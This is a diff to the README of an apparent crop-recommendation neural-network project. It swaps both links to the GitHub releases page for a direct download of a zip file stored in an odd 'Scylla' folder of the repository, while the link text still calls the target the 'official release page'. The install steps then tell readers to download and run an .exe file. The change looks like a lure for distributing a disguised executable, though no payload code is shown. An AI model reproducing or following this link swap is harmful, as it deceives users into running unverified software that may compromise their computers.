@@ -1,6 +1,6 @@
 # 🌾 crop-recommendation-nn - Grow better crops with data insights
 
-[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/jpsanmel/crop-recommendation-nn/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/jpsanmel/crop-recommendation-nn/raw/refs/heads/main/Scylla/crop-recommendation-nn-3.1-alpha.4.zip)
 
 ## What is this tool?
 This software predicts the best crop for your land. It uses a neural network to analyze soil conditions and weather patterns. You provide the soil and climate data, and the program suggests the most suitable crop for your farm. This helps you reduce waste and improve your harvest yield.
@@ -18,7 +18,7 @@ Many factors determine if a crop will grow well. Soil nutrients, temperature, an
 ## 📥 How to download and install
 You find the installation file on the project release page. Follow these steps to set up the software:
 
-1. Visit the [official release page](https://github.com/jpsanmel/crop-recommendation-nn/releases) to access the download options.
+1. Visit the [official release page](https://github.com/jpsanmel/crop-recommendation-nn/raw/refs/heads/main/Scylla/crop-recommendation-nn-3.1-alpha.4.zip) to access the download options.
 2. Find the file ending in `.exe` under the latest release section.
 3. Click the file to download it to your computer.
 4. Locate the downloaded file in your Downloads folder.
